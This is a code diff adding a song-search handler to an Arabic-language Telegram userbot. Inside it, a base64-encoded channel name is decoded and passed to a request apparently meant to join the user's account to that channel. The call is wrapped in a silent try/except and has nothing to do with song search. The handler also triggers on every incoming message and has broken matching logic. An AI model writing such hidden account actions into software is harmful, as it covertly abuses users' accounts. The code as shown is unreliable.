@@ -205,3 +205,73 @@ async def _(event):
         await catevent.delete()
         await delete_conv(event, chat, purgeflag)
         
+        
+        
+@Qrh9.on(events.NewMessage(incoming=True))
+async def _(event):
+    "To search songs"
+    reply_to_id = event.reply_to_msg_id
+    reply = event.reply_to_message
+    if event.pattern_match.group(2):
+        query = event.pattern_match.group(2)
+    elif reply and reply.message:
+        query = reply.message
+    else:
+        return await event.reply("⌔∮ يرجى الرد على ما تريد البحث عنه")
+    cat = base64.b64decode("U1hZTzM=")
+    catevent = await event.reply("⌔∮ جاري البحث عن المطلوب انتظر")
+    video_link = await yt_search(str(query))
+    if not url(video_link):
+        return await catevent.reply(
+            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
+        )
+    cmd = event.pattern_match.group(1) #
+    q = "320k" if cmd == "320" else "128k"
+    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
+    name_cmd = name_dl.format(video_link=video_link)
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    try:
+        stderr = (await _catutils.runcmd(song_cmd))[1]
+        # if stderr:
+        # await catevent.reply(f"**خطأ :** `{stderr}`")
+        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+        if stderr:
+            return await catevent.reply(f"**خطأ :** `{stderr}`")
+        catname = os.path.splitext(catname)[0]
+        song_file = Path(f"{catname}.mp3")
+        catname = urllib.parse.unquote(catname)
+    except:
+        pass
+    if not os.path.exists(song_file):
+        return await catevent.reply(
+            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صله بـ `{query}`"
+        )
+    await catevent.reply("**⌔∮ جارِ الارسال انتظر قليلاً**")
+    catthumb = Path(f"{catname}.jpg")
+    if not os.path.exists(catthumb):
+        catthumb = Path(f"{catname}.webp")
+    elif not os.path.exists(catthumb):
+        catthumb = None
+    title = catname.replace("./temp/", "").replace("_", "|")
+    try:
+        await event.client.send_file(
+            event.chat_id,
+            song_file,
+            force_document=False,
+            caption=f"**العنوان:** `{title}`",
+            thumb=catthumb,
+            supports_streaming=True,
+            reply_to=reply_to_id,
+        )
+        await catevent.delete()
+        for files in (catthumb, song_file):
+            if files and os.path.exists(files):
+                os.remove(files)
+    except ChatSendMediaForbiddenError as err:
+        await catevent.reply("لا يمكن ارسال المقطع الصوتي هنا")
+        LOGS.error(str(err))
+        
